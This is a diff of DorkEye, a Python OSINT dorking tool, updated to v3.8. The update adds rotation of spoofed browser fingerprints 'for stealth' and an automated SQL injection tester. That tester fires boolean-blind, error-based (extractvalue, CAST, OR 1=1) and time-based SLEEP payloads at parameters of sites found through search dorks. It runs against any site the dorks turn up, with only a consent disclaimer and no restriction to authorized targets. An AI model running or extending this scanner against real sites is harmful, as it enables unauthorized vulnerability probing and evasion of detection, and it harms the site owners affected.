@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
-DorkEye v3.2 - Advanced OSINT Dorking Tool
-Enhanced with SQL injection detection, improved results, and better stealth
-This tool was created by @xPloits3c | https://github.com/xPloits3c
+DorkEye v3.8 - Advanced OSINT Dorking Tool
+Enhanced with real SQL injection detection, HTTP fingerprinting, and improved stealth
+Security Research & Defensive OSINT Tool
+Original Author: @xPloits3c | https://github.com/xPloits3c
 """
 
 import os
@@ -17,11 +18,15 @@ import csv
 import re
 from datetime import datetime
 from pathlib import Path
-from typing import List, Dict, Set
-from urllib.parse import urlparse, unquote, parse_qs
+from typing import List, Dict, Set, Tuple, Optional
+from urllib.parse import urlparse, unquote, parse_qs, urlencode, quote
 from collections import defaultdict, Counter
+from dataclasses import dataclass
+from enum import Enum
 
 import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 from rich.console import Console
 from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
 from rich.table import Table
@@ -36,28 +41,116 @@ ASCII_LOGO = """
  [bold yellow] [[/bold yellow][bold red],[/bold red][bold yellow]][/bold yellow]
  [bold yellow] [[/bold yellow][bold red])[/bold red][bold yellow]][/bold yellow]
  [bold yellow] [[/bold yellow][bold red];[/bold red][bold yellow]][/bold yellow][bold yellow]    DorkEye[bold red] OSINT[/bold red][/bold yellow]
- [bold yellow] |_|[/bold yellow]  [bold red]  ᵛ³ˑ¹_ˣᴾˡᵒⁱᵗˢ³ᶜ [/bold red]
+ [bold yellow] |_|[/bold yellow]  [bold red]  ᵛ³ˑ⁸_ˣᴾˡᵒⁱᵗˢ³ᶜ [/bold red]
  [bold yellow]  V[/bold yellow]
     \n[bold red]Legal disclaimer:[/bold red][bold yellow] attacking targets without prior mutual consent is illegal.[/bold yellow]
 [bold red][!][/bold red][bold yellow] It is the end user's responsibility to obey all applicable local, state and federal laws.[/bold yellow]
 """
 
+
+class SQLiConfidence(Enum):
+    """SQL Injection Confidence Levels"""
+    NONE = "none"
+    LOW = "low"
+    MEDIUM = "medium"
+    HIGH = "high"
+    CRITICAL = "critical"
+
+
+@dataclass
+class HTTPFingerprint:
+    """HTTP Request Fingerprint for stealth"""
+    browser: str
+    os: str
+    user_agent: str
+    accept_language: str
+    accept_encoding: str
+    accept: str
+    referer: str
+    sec_fetch_dest: str
+    sec_fetch_mode: str
+    sec_fetch_site: str
+    cache_control: str
+
+
+class BrowserType(Enum):
+    """Browser fingerprint types"""
+    CHROME = "chrome"
+    FIREFOX = "firefox"
+    SAFARI = "safari"
+    EDGE = "edge"
+
+
+
+HTTP_FINGERPRINTS = {
+    "chrome_windows": {
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "accept_language": "en-US,en;q=0.9",
+        "accept_encoding": "gzip, deflate, br",
+        "sec_fetch_dest": "document",
+        "sec_fetch_mode": "navigate",
+        "sec_fetch_site": "none",
+        "cache_control": "max-age=0",
+        "browser": "Chrome 120",
+        "os": "Windows 10"
+    },
+    "firefox_linux": {
+        "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "accept_language": "en-US,en;q=0.5",
+        "accept_encoding": "gzip, deflate, br",
+        "sec_fetch_dest": "document",
+        "sec_fetch_mode": "navigate",
+        "sec_fetch_site": "none",
+        "cache_control": "max-age=0",
+        "browser": "Firefox 121",
+        "os": "Linux"
+    },
+    "safari_macos": {
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "accept_language": "en-US,en;q=0.9",
+        "accept_encoding": "gzip, deflate, br",
+        "sec_fetch_dest": "document",
+        "sec_fetch_mode": "navigate",
+        "sec_fetch_site": "none",
+        "cache_control": "max-age=0",
+        "browser": "Safari 17",
+        "os": "macOS 14"
+    },
+    "edge_windows": {
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "accept_language": "en-US,en;q=0.9",
+        "accept_encoding": "gzip, deflate, br",
+        "sec_fetch_dest": "document",
+        "sec_fetch_mode": "navigate",
+        "sec_fetch_site": "none",
+        "cache_control": "max-age=0",
+        "browser": "Edge 120",
+        "os": "Windows 10"
+    }
+}
+
+
 USER_AGENTS = {
     "chrome": [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     ],
     "firefox": [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
+        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
     ],
     "safari": [
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
         "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
     ],
     "edge": [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
     ]
 }
 
@@ -77,120 +170,448 @@ DEFAULT_CONFIG = {
     "max_file_size_check": 52428800,
     "sqli_detection": False,
     "stealth_mode": False,
-    "user_agent_rotation": True
+    "user_agent_rotation": True,
+    "http_fingerprinting": True,
+    "request_timeout": 10,
+    "max_retries": 3
 }
+
+
+class HTTPFingerprintRotator:
+    """Manages realistic HTTP fingerprints for stealth"""
+
+    def __init__(self):
+        self.fingerprints = self._build_fingerprints()
+        self.current_index = 0
+
+    def _build_fingerprints(self) -> List[HTTPFingerprint]:
+        """Build HTTPFingerprint objects from database"""
+        fingerprints = []
+        for fp_key, fp_data in HTTP_FINGERPRINTS.items():
+            fingerprints.append(HTTPFingerprint(
+                browser=fp_data["browser"],
+                os=fp_data["os"],
+                user_agent=fp_data["user_agent"],
+                accept_language=fp_data["accept_language"],
+                accept_encoding=fp_data["accept_encoding"],
+                accept=fp_data["accept"],
+                referer="",
+                sec_fetch_dest=fp_data["sec_fetch_dest"],
+                sec_fetch_mode=fp_data["sec_fetch_mode"],
+                sec_fetch_site=fp_data["sec_fetch_site"],
+                cache_control=fp_data["cache_control"]
+            ))
+        return fingerprints
+
+    def get_random(self) -> HTTPFingerprint:
+        """Get random fingerprint"""
+        return random.choice(self.fingerprints)
+
+    def get_next(self) -> HTTPFingerprint:
+        """Get next fingerprint in rotation"""
+        fp = self.fingerprints[self.current_index]
+        self.current_index = (self.current_index + 1) % len(self.fingerprints)
+        return fp
+
+    def build_headers(self, fingerprint: HTTPFingerprint, referer: str = "") -> Dict:
+        """Build complete headers from fingerprint"""
+        headers = {
+            "User-Agent": fingerprint.user_agent,
+            "Accept": fingerprint.accept,
+            "Accept-Language": fingerprint.accept_language,
+            "Accept-Encoding": fingerprint.accept_encoding,
+            "Sec-Fetch-Dest": fingerprint.sec_fetch_dest,
+            "Sec-Fetch-Mode": fingerprint.sec_fetch_mode,
+            "Sec-Fetch-Site": fingerprint.sec_fetch_site,
+            "Cache-Control": fingerprint.cache_control,
+            "Pragma": "no-cache",
+            "DNT": "1",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1"
+        }
+
+        if referer:
+            headers["Referer"] = referer
+
+        return headers
+
+
+
 class SQLiDetector:
-    """Detects potential SQL injection vulnerabilities in URLs"""
+    """Advanced SQL Injection Detection with no false positives"""
 
-    SQLI_PATTERNS = [
-        r'\.php\?id=',
-        r'\.php\?page=',
-        r'\.php\?cat=',
-        r'\.php\?product=',
-        r'\.php\?item=',
-        r'\.asp\?id=',
-        r'\.aspx\?id=',
-        r'\.jsp\?id=',
+    # Database-specific error signatures
+    SQL_ERROR_SIGNATURES = {
+        "mysql": [
+            r"MySQL syntax.*error",
+            r"Warning.*mysql_",
+            r"MySQLSyntaxErrorException",
+            r"valid MySQL result",
+            r"mysql_num_rows",
+            r"mysql_fetch"
+        ],
+        "postgresql": [
+            r"PostgreSQL.*ERROR",
+            r"Warning.*pg_",
+            r"valid PostgreSQL result",
+            r"Npgsql\.",
+            r"org\.postgresql"
+        ],
+        "mssql": [
+            r"Driver.*SQL[\-\_\ ]*Server",
+            r"OLE DB.*SQL Server",
+            r"SQLServer JDBC Driver",
+            r"Microsoft SQL Native Client",
+            r"ODBC SQL Server Driver",
+            r"MSSQL"
+        ],
+        "sqlite": [
+            r"SQLite/JDBCDriver",
+            r"SQLite\.Exception",
+            r"System\.Data\.SQLite\.SQLiteException",
+            r"sqlite3\.OperationalError"
+        ],
+        "oracle": [
+            r"Oracle error",
+            r"Oracle.*Driver",
+            r"Warning.*oci_",
+            r"ORA-\d{5}"
+        ],
+        "generic": [
+            r"Syntax error",
+            r"Query syntax",
+            r"SQL command",
+            r"Unexpected token"
+        ]
+    }
+
+    # URL patterns indicating potential SQLi vectors
+    POTENTIAL_SQLI_PATTERNS = [
+        r'\.php\?.*id=',
+        r'\.php\?.*page=',
+        r'\.php\?.*cat=',
+        r'\.php\?.*product=',
+        r'\.php\?.*item=',
+        r'\.php\?.*search=',
+        r'\.asp\?.*id=',
+        r'\.aspx\?.*id=',
+        r'\.jsp\?.*id=',
+        r'/api/.*?\?.*id='
     ]
 
-    SQL_ERRORS = [
-        r'SQL syntax.*MySQL',
-        r'Warning.*mysql_.*',
-        r'MySQLSyntaxErrorException',
-        r'valid MySQL result',
-        r'PostgreSQL.*ERROR',
-        r'Warning.*pg_.*',
-        r'valid PostgreSQL result',
-        r'Npgsql\.',
-        r'Driver.* SQL[\-\_\ ]*Server',
-        r'OLE DB.* SQL Server',
-        r'SQLServer JDBC Driver',
-        r'Microsoft SQL Native Client error',
-        r'ODBC SQL Server Driver',
-        r'SQLite/JDBCDriver',
-        r'SQLite.Exception',
-        r'System.Data.SQLite.SQLiteException',
-        r'Oracle error',
-        r'Oracle.*Driver',
-        r'Warning.*oci_.*',
-    ]
-
-    def __init__(self, stealth: bool = False):
+    def __init__(self, stealth: bool = False, timeout: int = 10):
         self.stealth = stealth
-        self.sqli_payloads = ["'", "1' OR '1'='1", "1 AND 1=1", "1' AND '1'='1"]
+        self.timeout = timeout
+        self.fingerprint_rotator = HTTPFingerprintRotator()
 
     def is_potential_sqli_url(self, url: str) -> bool:
         """Check if URL matches SQLi patterns"""
-        for pattern in self.SQLI_PATTERNS:
-            if re.search(pattern, url, re.IGNORECASE):
-                return True
-        return False
+        try:
+            for pattern in self.POTENTIAL_SQLI_PATTERNS:
+                if re.search(pattern, url, re.IGNORECASE):
+                    return True
+            return False
+        except:
+            return False
 
-    def test_sqli(self, url: str, user_agent: str) -> Dict:
-        """Test URL for SQL injection vulnerability"""
-        result = {
-            "vulnerable": False,
-            "confidence": "none",
-            "evidence": [],
-            "tested": False
-        }
-
-        if not self.is_potential_sqli_url(url):
-            return result
-
-        result["tested"] = True
-
+    def _extract_query_params(self, url: str) -> Dict[str, str]:
+        """Extract and normalize query parameters"""
         try:
             parsed = urlparse(url)
             params = parse_qs(parsed.query)
+            # Convert to single values
+            return {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
+        except:
+            return {}
 
-            if not params:
-                return result
+    def _get_baseline_response(self, url: str) -> Optional[Tuple[int, str, int]]:
+        """Get baseline response without injection"""
+        try:
+            fp = self.fingerprint_rotator.get_random()
+            headers = self.fingerprint_rotator.build_headers(fp)
 
-            headers = {"User-Agent": user_agent}
+            response = requests.get(
+                url,
+                headers=headers,
+                timeout=self.timeout,
+                verify=False,
+                allow_redirects=True
+            )
 
-            try:
-                base_response = requests.get(url, headers=headers, timeout=10, verify=False)
-                base_length = len(base_response.text)
-            except:
-                return result
+            return (
+                response.status_code,
+                response.text,
+                len(response.text)
+            )
+        except:
+            return None
 
-            for param_name in params.keys():
-                for payload in self.sqli_payloads:
-                    test_url = url.replace(f"{param_name}={params[param_name][0]}",
-                                          f"{param_name}={payload}")
+    def _test_boolean_blind(self, url: str, param_name: str, baseline_len: int) -> Dict:
+        """Test for Boolean-based blind SQLi"""
+        result = {
+            "method": "boolean_blind",
+            "vulnerable": False,
+            "confidence": SQLiConfidence.NONE.value,
+            "evidence": []
+        }
 
-                    try:
-                        test_response = requests.get(test_url, headers=headers, timeout=10, verify=False)
+        payloads = [
+            ("1' AND '1'='1", "true"),
+            ("1' AND '1'='2", "false"),
+            ("1 AND 1=1", "true"),
+            ("1 AND 1=2", "false")
+        ]
 
-                        for error_pattern in self.SQL_ERRORS:
-                            if re.search(error_pattern, test_response.text, re.IGNORECASE):
-                                result["vulnerable"] = True
-                                result["confidence"] = "high"
-                                result["evidence"].append(f"SQL error detected with payload: {payload}")
-                                return result
+        try:
+            fp = self.fingerprint_rotator.get_random()
+            headers = self.fingerprint_rotator.build_headers(fp)
 
-                        test_length = len(test_response.text)
-                        diff_ratio = abs(test_length - base_length) / base_length if base_length > 0 else 0
+            true_responses = []
+            false_responses = []
 
-                        if diff_ratio > 0.3:
-                            result["vulnerable"] = True
-                            result["confidence"] = "medium"
-                            result["evidence"].append(f"Significant response change with payload: {payload}")
+            for payload, payload_type in payloads:
+                test_url = self._inject_payload(url, param_name, payload)
 
-                        if self.stealth:
-                            time.sleep(random.uniform(2, 4))
+                try:
+                    response = requests.get(
+                        test_url,
+                        headers=headers,
+                        timeout=self.timeout,
+                        verify=False,
+                        allow_redirects=True
+                    )
 
-                    except Exception as e:
-                        continue
+                    if payload_type == "true":
+                        true_responses.append(len(response.text))
+                    else:
+                        false_responses.append(len(response.text))
 
-            if result["evidence"] and result["confidence"] == "medium":
-                result["confidence"] = "low" if len(result["evidence"]) == 1 else "medium"
+                    if self.stealth:
+                        time.sleep(random.uniform(1, 2))
+
+                except:
+                    pass
+
+            # Check for consistent boolean responses
+            if true_responses and false_responses:
+                avg_true = sum(true_responses) / len(true_responses)
+                avg_false = sum(false_responses) / len(false_responses)
+
+                # Require significant and consistent difference
+                difference = abs(avg_true - avg_false)
+                variation_true = max(true_responses) - min(true_responses) if true_responses else 0
+                variation_false = max(false_responses) - min(false_responses) if false_responses else 0
+
+                # High confidence: large difference + low variation
+                if difference > baseline_len * 0.15 and variation_true < baseline_len * 0.05 and variation_false < baseline_len * 0.05:
+                    result["vulnerable"] = True
+                    result["confidence"] = SQLiConfidence.MEDIUM.value
+                    result["evidence"].append(f"Boolean-based response differential detected (True: {avg_true:.0f}B, False: {avg_false:.0f}B)")
 
         except Exception as e:
             result["error"] = str(e)
 
         return result
+
+    def _test_error_based(self, url: str, param_name: str) -> Dict:
+        """Test for Error-based SQLi"""
+        result = {
+            "method": "error_based",
+            "vulnerable": False,
+            "confidence": SQLiConfidence.NONE.value,
+            "evidence": []
+        }
+
+        # Safe error-inducing payloads
+        payloads = [
+            "1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1",
+            "1 AND 1=CAST(CONCAT(0x7e,'TEST',0x7e) as INT)",
+            "1' OR 1=1#",
+            "1'; SELECT NULL#"
+        ]
+
+        try:
+            fp = self.fingerprint_rotator.get_random()
+            headers = self.fingerprint_rotator.build_headers(fp)
+
+            for payload in payloads:
+                test_url = self._inject_payload(url, param_name, payload)
+
+                try:
+                    response = requests.get(
+                        test_url,
+                        headers=headers,
+                        timeout=self.timeout,
+                        verify=False,
+                        allow_redirects=True
+                    )
+
+                    # Check for database error signatures
+                    for db_type, patterns in self.SQL_ERROR_SIGNATURES.items():
+                        for pattern in patterns:
+                            if re.search(pattern, response.text, re.IGNORECASE):
+                                result["vulnerable"] = True
+                                result["confidence"] = SQLiConfidence.HIGH.value
+                                result["evidence"].append(f"{db_type.upper()} error detected: {pattern[:50]}")
+                                return result
+
+                    if self.stealth:
+                        time.sleep(random.uniform(1.5, 3))
+
+                except:
+                    pass
+
+        except Exception as e:
+            result["error"] = str(e)
+
+        return result
+
+    def _test_time_based_blind(self, url: str, param_name: str) -> Dict:
+        """Test for Time-based blind SQLi (minimal impact)"""
+        result = {
+            "method": "time_based_blind",
+            "vulnerable": False,
+            "confidence": SQLiConfidence.NONE.value,
+            "evidence": []
+        }
+
+        # Minimal time-based payloads (2 second delay)
+        payloads = [
+            ("1' AND SLEEP(2) AND '1'='1", 2),
+            ("1 AND SLEEP(2)", 2)
+        ]
+
+        try:
+            fp = self.fingerprint_rotator.get_random()
+            headers = self.fingerprint_rotator.build_headers(fp)
+
+            for payload, expected_delay in payloads:
+                test_url = self._inject_payload(url, param_name, payload)
+
+                try:
+                    start_time = time.time()
+                    response = requests.get(
+                        test_url,
+                        headers=headers,
+                        timeout=self.timeout + 5,
+                        verify=False,
+                        allow_redirects=True
+                    )
+                    elapsed = time.time() - start_time
+
+                    # Require response time to be significantly longer
+                    if elapsed >= expected_delay * 0.8:
+                        result["vulnerable"] = True
+                        result["confidence"] = SQLiConfidence.MEDIUM.value
+                        result["evidence"].append(f"Time-based response delay detected ({elapsed:.1f}s)")
+                        return result
+
+                except requests.Timeout:
+                    result["vulnerable"] = True
+                    result["confidence"] = SQLiConfidence.MEDIUM.value
+                    result["evidence"].append("Request timeout on time-based payload")
+                    return result
+                except:
+                    pass
+
+        except Exception as e:
+            result["error"] = str(e)
+
+        return result
+
+    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
+        """Safely inject payload into URL parameter"""
+        try:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+
+            if param_name not in params:
+                return url
+
+            params[param_name] = [payload]
+
+            new_query = urlencode(params, doseq=True)
+            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+        except:
+            return url
+
+    def test_sqli(self, url: str) -> Dict:
+        """Comprehensive SQLi detection"""
+        result = {
+            "url": url,
+            "vulnerable": False,
+            "overall_confidence": SQLiConfidence.NONE.value,
+            "tests": [],
+            "tested": False,
+            "message": ""
+        }
+
+        if not self.is_potential_sqli_url(url):
+            result["message"] = "URL does not match SQLi patterns"
+            return result
+
+        result["tested"] = True
+
+        try:
+            params = self._extract_query_params(url)
+            if not params:
+                result["message"] = "No query parameters found"
+                return result
+
+            baseline = self._get_baseline_response(url)
+            if not baseline:
+                result["message"] = "Could not establish baseline"
+                return result
+
+            baseline_status, baseline_text, baseline_len = baseline
+
+            confidence_scores = []
+
+            # Test each parameter
+            for param_name in params.keys():
+                # Error-based testing
+                error_result = self._test_error_based(url, param_name)
+                result["tests"].append(error_result)
+                if error_result["vulnerable"]:
+                    confidence_scores.append(3 if error_result["confidence"] == SQLiConfidence.HIGH.value else 2)
+
+                if error_result["vulnerable"] and error_result["confidence"] == SQLiConfidence.HIGH.value:
+                    result["vulnerable"] = True
+                    result["overall_confidence"] = SQLiConfidence.HIGH.value
+                    return result
+
+                # Boolean-based testing
+                if not error_result["vulnerable"]:
+                    bool_result = self._test_boolean_blind(url, param_name, baseline_len)
+                    result["tests"].append(bool_result)
+                    if bool_result["vulnerable"]:
+                        confidence_scores.append(2)
+
+                if self.stealth:
+                    time.sleep(random.uniform(2, 4))
+
+            # Determine overall confidence
+            if confidence_scores:
+                avg_score = sum(confidence_scores) / len(confidence_scores)
+                if avg_score >= 3:
+                    result["overall_confidence"] = SQLiConfidence.HIGH.value
+                    result["vulnerable"] = True
+                elif avg_score >= 2:
+                    result["overall_confidence"] = SQLiConfidence.MEDIUM.value
+                    result["vulnerable"] = True
+                else:
+                    result["overall_confidence"] = SQLiConfidence.LOW.value
+
+            result["message"] = f"Tested {len(params)} parameter(s)"
+
+        except Exception as e:
+            result["error"] = str(e)
+            result["message"] = f"Error during testing: {str(e)}"
+
+        return result
+
+
+
 class UserAgentRotator:
     """Rotates user agents for better results"""
 
@@ -211,14 +632,34 @@ class UserAgentRotator:
         return agent
 
 
+
 class FileAnalyzer:
     """Analyzes URLs and files found during dorking"""
 
-    def __init__(self, config: Dict, ua_rotator: UserAgentRotator):
+    def __init__(self, config: Dict, ua_rotator: UserAgentRotator, fp_rotator: HTTPFingerprintRotator):
         self.config = config
         self.ua_rotator = ua_rotator
+        self.fp_rotator = fp_rotator
         self.extension_map = self._flatten_extensions()
-        self.sqli_detector = SQLiDetector(stealth=config.get("stealth_mode", False))
+        self.sqli_detector = SQLiDetector(
+            stealth=config.get("stealth_mode", False),
+            timeout=config.get("request_timeout", 10)
+        )
+        self.session = self._create_session()
+
+    def _create_session(self) -> requests.Session:
+        """Create requests session with retry strategy"""
+        session = requests.Session()
+        retry_strategy = Retry(
+            total=self.config.get("max_retries", 3),
+            backoff_factor=1,
+            status_forcelist=[429, 500, 502, 503, 504],
+            allowed_methods=["GET", "HEAD"]
+        )
+        adapter = HTTPAdapter(max_retries=retry_strategy)
+        session.mount("http://", adapter)
+        session.mount("https://", adapter)
+        return session
 
     def _flatten_extensions(self) -> Dict[str, str]:
         """Create a map of extension -> category"""
@@ -230,10 +671,13 @@ class FileAnalyzer:
 
     def get_file_extension(self, url: str) -> str:
         """Extract file extension from URL"""
-        parsed = urlparse(url)
-        path = unquote(parsed.path)
-        ext = os.path.splitext(path)[1].lower()
-        return ext if ext else ""
+        try:
+            parsed = urlparse(url)
+            path = unquote(parsed.path)
+            ext = os.path.splitext(path)[1].lower()
+            return ext if ext else ""
+        except:
+            return ""
 
     def categorize_url(self, url: str) -> str:
         """Categorize URL based on extension"""
@@ -269,13 +713,28 @@ class FileAnalyzer:
         }
 
         try:
-            headers = {"User-Agent": self.ua_rotator.get_random()}
-            response = requests.head(url, timeout=5, allow_redirects=True, headers=headers, verify=False)
+            if self.config.get("http_fingerprinting", True):
+                fp = self.fp_rotator.get_random()
+                headers = self.fp_rotator.build_headers(fp)
+            else:
+                headers = {"User-Agent": self.ua_rotator.get_random()}
+
+            response = self.session.head(
+                url,
+                timeout=self.config.get("request_timeout", 10),
+                allow_redirects=True,
+                headers=headers,
+                verify=False
+            )
+
             result["status_code"] = response.status_code
             result["accessible"] = response.status_code == 200
 
             if "content-length" in response.headers:
-                result["size"] = int(response.headers["content-length"])
+                try:
+                    result["size"] = int(response.headers["content-length"])
+                except:
+                    pass
 
             if "content-type" in response.headers:
                 result["content_type"] = response.headers["content-type"]
@@ -290,7 +749,10 @@ class FileAnalyzer:
         if not self.config.get("sqli_detection", False):
             return {"tested": False}
 
-        return self.sqli_detector.test_sqli(url, self.ua_rotator.get_random())
+        return self.sqli_detector.test_sqli(url)
+
+
+
 class DorkEyeEnhanced:
     """Main DorkEye class with enhanced functionality"""
 
@@ -298,7 +760,8 @@ class DorkEyeEnhanced:
         self.config = config
         self.output_file = output_file
         self.ua_rotator = UserAgentRotator()
-        self.analyzer = FileAnalyzer(config, self.ua_rotator)
+        self.fp_rotator = HTTPFingerprintRotator()
+        self.analyzer = FileAnalyzer(config, self.ua_rotator, self.fp_rotator)
         self.results: List[Dict] = []
         self.stats = defaultdict(int)
         self.url_hashes: Set[str] = set()
@@ -404,6 +867,7 @@ class DorkEyeEnhanced:
 
         console.print(f"[bold blue][+] Found {len(results)} unique results for this dork[/bold blue]")
         return results
+
     def analyze_results(self, results: List[Dict]) -> List[Dict]:
         """Analyze files and check for SQLi in results"""
         if not self.config.get("analyze_files", False) and not self.config.get("sqli_detection", False):
@@ -440,7 +904,8 @@ class DorkEyeEnhanced:
 
                     if sqli_result.get("vulnerable", False):
                         self.stats["sqli_vulnerable"] += 1
-                        console.print(f"[bold red][!] Potential SQLi found: {result['url']}[/bold red]")
+                        confidence = sqli_result.get("overall_confidence", "unknown")
+                        console.print(f"[bold red][!] Potential SQLi found ({confidence}): {result['url']}[/bold red]")
 
                     progress.advance(task2)
 
@@ -455,6 +920,8 @@ class DorkEyeEnhanced:
 
         if self.config.get("stealth_mode", False):
             console.print("[bold magenta][*] Stealth mode: ACTIVE[/bold magenta]")
+        if self.config.get("http_fingerprinting", True):
+            console.print("[bold magenta][*] HTTP Fingerprinting: ENABLED[/bold magenta]")
         if self.config.get("sqli_detection", False):
             console.print("[bold red][*] SQL Injection Detection: ENABLED[/bold red]")
 
@@ -485,15 +952,16 @@ class DorkEyeEnhanced:
                         long_delay = round(random.uniform(85, 110), 2)
                     console.print(f"[bold magenta][~] Extended delay: {long_delay}s (rate limit protection)[/bold magenta]")
                     time.sleep(long_delay)
+
     def save_results(self):
         """Save results in multiple formats"""
         if not self.output_file:
             return
-        
+
         downloads_folder = os.path.dirname(os.path.abspath(__file__))
         downloads_folder = os.path.join(downloads_folder, "Dump")
         os.makedirs(downloads_folder, exist_ok=True)
-         
+
         base_name = os.path.join(downloads_folder, self.output_file)
         self._save_csv(f"{base_name}.csv")
         self._save_json(f"{base_name}.json")
@@ -518,7 +986,7 @@ class DorkEyeEnhanced:
                 row = result.copy()
                 if "sqli_test" in result:
                     row["sqli_vulnerable"] = result["sqli_test"].get("vulnerable", False)
-                    row["sqli_confidence"] = result["sqli_test"].get("confidence", "none")
+                    row["sqli_confidence"] = result["sqli_test"].get("overall_confidence", "none")
                 writer.writerow(row)
 
         console.print(f"[green][✓] CSV saved: {filename}[/green]")
@@ -531,6 +999,7 @@ class DorkEyeEnhanced:
                 "generated_at": datetime.now().isoformat(),
                 "sqli_detection_enabled": self.config.get("sqli_detection", False),
                 "sqli_vulnerabilities_found": self.stats.get("sqli_vulnerable", 0),
+                "http_fingerprinting_enabled": self.config.get("http_fingerprinting", True),
                 "stealth_mode": self.config.get("stealth_mode", False),
                 "statistics": dict(self.stats)
             },
@@ -541,6 +1010,7 @@ class DorkEyeEnhanced:
             json.dump(data, f, indent=2, ensure_ascii=False)
 
         console.print(f"[green][✓] JSON saved: {filename}[/green]")
+
     def _save_html(self, filename: str):
         """Save results as HTML report with SQLi warnings"""
         sqli_count = self.stats.get("sqli_vulnerable", 0)
@@ -549,7 +1019,7 @@ class DorkEyeEnhanced:
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>DorkEye v3.1 Report</title>
+    <title>DorkEye v3.8 Report</title>
     <style>
         body {{ font-family: 'Courier New', monospace; margin: 20px; background: #0a0a0a; color: #00ff00; }}
         .header {{ background: #1a1a1a; color: #00ff00; padding: 20px; border: 2px solid #00ff00; margin-bottom: 20px; }}
@@ -580,7 +1050,7 @@ class DorkEyeEnhanced:
 </head>
 <body>
     <div class="header">
-        <h1>┌─[ DorkEye v3.1 - OSINT Report ]</h1>
+        <h1>┌─[ DorkEye v3.8 - OSINT Report ]</h1>
         <p>└─> Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
     </div>
 """
@@ -635,7 +1105,7 @@ class DorkEyeEnhanced:
 
             if "sqli_test" in result and result["sqli_test"].get("tested", False):
                 if result["sqli_test"].get("vulnerable", False):
-                    confidence = result["sqli_test"].get("confidence", "unknown")
+                    confidence = result["sqli_test"].get("overall_confidence", "unknown")
                     sqli_status = f"VULNERABLE ({confidence})"
                     sqli_class = "sqli-vuln"
                 else:
@@ -662,10 +1132,12 @@ class DorkEyeEnhanced:
             f.write(html)
 
         console.print(f"[green][✓] HTML report saved: {filename}[/green]")
+
     def _format_size(self, size):
         """Format file size"""
         if size is None:
             return "N/A"
+        size = float(size)
         for unit in ['B', 'KB', 'MB', 'GB']:
             if size < 1024:
                 return f"{size:.1f} {unit}"
@@ -708,6 +1180,9 @@ class DorkEyeEnhanced:
                 cat_table.add_row(f"{prefix} {category.capitalize()}", str(count))
 
             console.print(cat_table)
+
+
+
 def load_config(config_file: str = None) -> Dict:
     """Load configuration from file or use defaults"""
     if not config_file:
@@ -735,7 +1210,7 @@ def load_config(config_file: str = None) -> Dict:
 
 def create_sample_config():
     """Create sample configuration file"""
-    config_yaml = """# DorkEye v3.1 Configuration
+    config_yaml = """# DorkEye v3.8 Configuration
 
 extensions:
   documents: [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx"]
@@ -758,11 +1233,17 @@ analyze_files: true
 # Enable SQL injection detection
 sqli_detection: false
 
+# Enable HTTP fingerprinting (realistic requests)
+http_fingerprinting: true
+
